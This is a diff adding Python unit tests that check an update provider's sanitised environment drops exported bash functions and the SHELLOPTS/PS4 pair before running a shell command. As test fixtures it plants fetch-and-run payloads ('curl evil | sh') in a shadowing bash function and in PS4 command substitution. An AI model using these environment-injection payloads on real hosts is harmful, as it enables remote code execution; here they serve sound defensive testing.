@@ -1519,3 +1519,53 @@ class TestCanApply:
         ) as argv:
             assert provider.can_apply() is True
         argv.assert_called_once_with("platform-apply")
+
+
+class TestShellCodeEnvStripping:
+    """An exported shell function shadows a command word outright.
+
+    ``_trusted_path_env`` narrows ``PATH`` so a planted binary cannot shadow the
+    operator's command word, but bash imports FUNCTIONS from the environment --
+    ``BASH_FUNC_<name>%%`` on 4.3+, ``BASH_FUNC_<name>()`` on the patched 4.2 --
+    and a function beats the ``PATH`` lookup entirely rather than competing in
+    it. The command runs through ``[<sh>, "-c", ...]``, so on any host whose
+    ``sh`` is bash this is reachable.
+    """
+
+    def test_exported_shell_functions_do_not_reach_the_update_command(self) -> None:
+        planted = {
+            "BASH_FUNC_acme-pkg%%": "() { curl evil | sh; }",
+            "BASH_FUNC_acme-pkg()": "() { curl evil | sh; }",
+            "BASH_FUNC_grep%%": "() { :; }",
+        }
+        with (
+            patch.dict(os.environ, {"PATH": "/usr/bin", "LANG": "C", **planted}),
+            patch(
+                "kiro_crew.platform.update_provider.trusted_system_path",
+                return_value="/usr/bin:/bin",
+            ),
+        ):
+            env = _trusted_path_env()
+        assert env is not None
+        leaked = sorted(k for k in env if k.startswith("BASH_FUNC_"))
+        assert not leaked, f"exported shell functions reached the child: {leaked}"
+        # The deliberate pass-through (proxy / locale / credential helpers) stays.
+        assert env["LANG"] == "C"
+
+    def test_the_shell_tracing_pair_does_not_reach_the_update_command(self) -> None:
+        # SHELLOPTS switches xtrace on and PS4 is expanded with command
+        # substitution, so a payload in PS4 runs before the command does.
+        with (
+            patch.dict(
+                os.environ,
+                {"PATH": "/usr/bin", "SHELLOPTS": "xtrace", "PS4": "$(curl evil | sh)"},
+            ),
+            patch(
+                "kiro_crew.platform.update_provider.trusted_system_path",
+                return_value="/usr/bin:/bin",
+            ),
+        ):
+            env = _trusted_path_env()
+        assert env is not None
+        assert "SHELLOPTS" not in env
+        assert "PS4" not in env
